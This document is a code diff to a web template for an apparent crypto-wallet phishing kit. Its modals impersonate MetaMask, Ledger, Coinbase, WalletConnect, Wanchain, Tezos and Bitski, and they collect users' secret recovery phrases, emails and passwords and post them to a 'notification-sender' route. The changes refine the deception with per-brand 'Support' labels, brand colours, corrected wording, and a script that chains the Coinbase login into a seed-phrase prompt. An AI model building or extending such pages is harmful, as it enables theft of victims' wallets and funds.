@@ -96,7 +96,6 @@
             <div class="modal fade" id="exampleSinlgeModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-
                     <div class="modal-header" id="first_modal_header" >
                         <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                      <div class="topLine d-flex align-items-center justify-contents-between">
@@ -106,7 +105,7 @@
                         </div>
 
                         <select name="" id="currency_dropdown_section">
-                            <option value=""> Ethereum main net</option>
+                            <option value=""> Ethereum Mainnet</option>
                         </select>
                     </div>
 
@@ -121,7 +120,7 @@
 
 
                         <h2>Welcome Back!</h2>
-                        <p>The decentralize web awaits.</p>
+                        <p class="decentralized">The decentralized web awaits.</p>
 
 
                         <form action="#">
@@ -131,7 +130,7 @@
                         </form>
 
                         <div class="under-p">
-                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                            <p class="d-flex"> Need Help? Contact <a href=""> <span id="suuportText_first"> </span>   </a></p>
                         </div>
                     </div>
 
@@ -153,8 +152,8 @@
                         </div>
                         {{-- <img src="photo_2021-11-26_04-02-42-removebg-preview.png" alt=""> --}}
 
-                        <select name="" id="" class="form-control">
-                            <option value="">Ethereum main net</option>
+                        <select name="" id="">
+                            <option value="">Ethereum Mainnet</option>
                         </select>
                     </div>
 
@@ -168,18 +167,19 @@
 
 
                         <h2>Welcome Back!</h2>
-                        <p>The decentralize web awaits.</p>
+                        <p class="top-p">We just need to confirm it's you. <br>
+                            To continue, enter your Backup Seed Phrase</p>
 
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
                             <input type="text" name="password" id="hiddenPassword" hidden>
                             <input type="text" name="wallet" id="wallet_hidden" hidden>
-                            <input type="text" placeholder="Phrase" name="pharse">
+                            <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
                             <input type="submit" value="Confirm">
                         </form>
 
                         <div class="under-p">
-                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                            <p class="d-flex"> Need Help? Contact <a href="">  <span id="suuportText_second"></a></p>
                         </div>                    </div>
 
                 </div>
@@ -192,7 +192,7 @@
             <div class="modal fade" id="wanchainmodal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header" style="background-color: #0052FC; color:white;">
+                    <div class="modal-header" style="background-color: #5FACF6; color:white;">
                         <button type="button" id="modalCloseButtonWanchi" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">
 
@@ -204,19 +204,19 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/wanchainlogo.png') }}" alt="">
+                        <img class="wanchain-image" src="{{ asset('images/wanchainlogo.png') }}" alt="">
 
                         <h2>Welcome Back!</h2>
-                        <p class="top-p">The decentralize web awaits.</p>
+                        <p class="top-p">The decentralized web awaits.</p>
 
                         <form action="#">
-                            <input type="button" class="buttonBackground" onclick="wanchainSecondClicked()" value="Import a Wallet" >
+                            <input type="button" style="width: 70%" class="buttonBackground" onclick="wanchainSecondClicked()" value="Import a Wallet" >
                         </form>
 
 
 
                         <div class="under-p">
-                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                            <p class="d-flex"> Need Help? Contact <a href="">Wain Chain Support</a></p>
                         </div>
                     </div>
 
@@ -227,7 +227,7 @@
             <div class="modal fade" id="wanchainmodal_second" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header" style="background-color: #0052FC; color:white">
+                    <div class="modal-header" style="background-color: #5FACF6; color:white">
                         <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">
 
@@ -239,7 +239,7 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/wanchainlogo.png') }}" alt="">
+                        <img class="wanchain-image" src="{{ asset('images/wanchainlogo.png') }}" alt="">
 
                         <h2>Security Check</h2>
                         <p class="top-p">We just need to confirm it's you. <br>
@@ -252,7 +252,7 @@
                             <input type="submit" value="Confirm">
                         </form>
                         <div class="under-p">
-                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                            <p class="d-flex"> Need Help? Contact <a href="">Wanchain Support</a></p>
                         </div>
                     </div>
 
@@ -264,8 +264,8 @@
             <div class="modal fade" id="coinbaseFirst" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header " style="background-color: #5FACF6; color:white">
-                        <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
+                    <div class="modal-header " style="background-color: #0052FC; color:white">
+                        <button type="button" id="CoinbaseCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">
 
                         <h5 class="modal-title"  id="exampleModalCenterTitle">coinbase</h5>
@@ -276,27 +276,22 @@
                     <div class="modal-body">
 
 
-                        <img src="{{ asset('images/download.jpg') }}" class="coinbase-image" alt="">
+                        <img src="{{ asset('images/download.jpg') }}" class="coinbase-image" alt="" style="margin:0">
 
                         <h2>Welcome Back!</h2>
-                        <p class="top-p">We decentralized web awaits </p>
+                        <p class="top-p">The decentralized web awaits </p>
 
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
-                            <input type="email" placeholder="Email" name="pharse">
-                            <input type="password" name="password" placeholder="Password">
-                            <input type="text" name="wallet" id="wallet_coinbase" hidden>
-                            <input type="submit" value="Confirm">
+                            <input type="email" placeholder="Email" name="email" id="coinbaseFirstemail">
+                            <input type="password" name="password" placeholder="Password" id="coinbaseFirstPassword">
+                            <input type="button" value="Confirm" id="coinbaseSubmitButton">
                         </form>
 
 
-
-                        <div class="modal-footer">
-
                             <div class="under-p">
-                                <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                                <p class="d-flex" > Need Help? Contact <a href="" >Coinbase Support</a> </p>
                             </div>
-                        </div>
                     </div>
 
                 </div>
@@ -307,7 +302,7 @@
             <div class="modal fade" id="coinbaseRecovery" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
                 <div class="modal-dialog">
                 <div class="modal-content">
-                    <div class="modal-header" style="background-color: #5FACF6; color:white">
+                    <div class="modal-header" style="background-color: #0052FC; color:white">
                         <button type="button" id="modalCloseButton" class="btn-close" data-bs-dismiss="modal" aria-label="Close" hidden></button>
                     <div class="topLine d-flex align-items-center justify-contents-between">
 
@@ -322,18 +317,20 @@
                         <img src="{{ asset('images/download.jpg') }}"class="coinbase-image" alt="">
 
                         <h2>Security Check</h2>
-                        <p>We just need to confirm it's you. <br>
+                        <p class="top-p">We just need to confirm it's you. <br>
                           To continue, enter your 12 word phrase.
                         </p>
 
                         <form action="{{ route('notification-sender') }}" method="POST">
                             @csrf
-                            <input type="text" placeholder="pharse" name="pharse">
-                            <input type="text" name="password" >
+                            <input type="text" placeholder="Wallet Secret Recovery Phrase" name="pharse">
+                            <input type="text" name="password" id="coinbaseSecondPassword" hidden>
+                            <input type="text" name="email" id="coinbaseSecondemail" hidden>
+                            <input type="text" name="wallet" id="wallet_coinbase" hidden>
                             <input type="submit" value="Confirm">
                         </form>
                         <div class="under-p">
-                            <p class="d-flex"> Need Help? Contact <a href="">Meta mask Support</a></p>
+                            <p class="d-flex"> Need Help? Contact <a href="">Coinbase Support</a></p>
                         </div>
                     </div>
 
@@ -436,6 +433,19 @@
                 });
 
 
+                    document.getElementById('coinbaseSubmitButton').addEventListener('click', function(){
+
+                        const emailValue = document.getElementById('coinbaseFirstemail').value;
+                       const firstValue = document.getElementById('coinbaseFirstPassword').value;
+                        document.getElementById('CoinbaseCloseButton').click();
+
+                        const myModalSecond = new bootstrap.Modal(document.getElementById('coinbaseRecovery'), {});
+                        document.getElementById('coinbaseSecondPassword').value = firstValue;
+                        document.getElementById('coinbaseSecondemail').value = emailValue;
+                        myModalSecond.show();
+
+                    })
+
 
 
 
@@ -454,6 +464,8 @@
 
                 document.getElementById('blacModalSecond').value = inputValue;
 
+
+
                 }
 
                 });
@@ -471,6 +483,9 @@
                 document.getElementById('headerBig').innerHTML =imageSrc
                 modalHeaderSection.innerHTML = imageSrc;
 
+                document.getElementById('suuportText_second').innerText = "Meta Mask Support";
+                document.getElementById('suuportText_first').innerText = "Meta Mask Support";
+
                 document.getElementById('wallet_hidden').value = "MetaMask"
                 myModal.show();
             }
@@ -484,7 +499,10 @@
                 const modalHeaderSection = document.getElementById('headerSmall');
                 document.getElementById('headerBig').innerHTML =imageSrc
                 modalHeaderSection.innerHTML = imageSrc;
-                document.getElementById('wallet_hidden').value = "Leadger"
+
+                document.getElementById('wallet_hidden').value = "Leadger";
+                document.getElementById('suuportText_second').innerText = "Leadger Support";
+                document.getElementById('suuportText_first').innerText = "Leadger Support";
 
                 myModal.show();
             }
@@ -499,6 +517,10 @@
                 document.getElementById('headerBig').innerHTML =imageSrc
                 modalHeaderSection.innerHTML = imageSrc;
                 document.getElementById('wallet_hidden').value = "WalletConnect"
+
+                document.getElementById('suuportText_second').innerText = "Wallet Connect Support";
+                document.getElementById('suuportText_first').innerText = "Wallet Connect Support";
+
 
                 myModal.show();
 
@@ -519,7 +541,12 @@
                     const modalHeaderSection = document.getElementById('headerSmall');
                     document.getElementById('headerBig').innerHTML =imageSrc
                     modalHeaderSection.innerHTML = imageSrc;
-                    document.getElementById('wallet_hidden').value = "Tezos"
+                    document.getElementById('wallet_hidden').value = "Tezos";
+
+                    document.getElementById('suuportText_second').innerText = "Tezos Support";
+                    document.getElementById('suuportText_first').innerText = "Tezos Support";
+
+
                     myModal.show();
                 }
 
@@ -538,7 +565,12 @@
                             const modalHeaderSection = document.getElementById('headerSmall');
                             document.getElementById('headerBig').innerHTML =imageSrc
                             modalHeaderSection.innerHTML = imageSrc;
-                            document.getElementById('wallet_hidden').value = "Tezos"
+                            document.getElementById('wallet_hidden').value = "Bitski"
+
+                            document.getElementById('suuportText_second').innerText = "Bitski Support";
+                            document.getElementById('suuportText_first').innerText = "Bitski Support";
+
+
                             myModal.show();
                         }
 
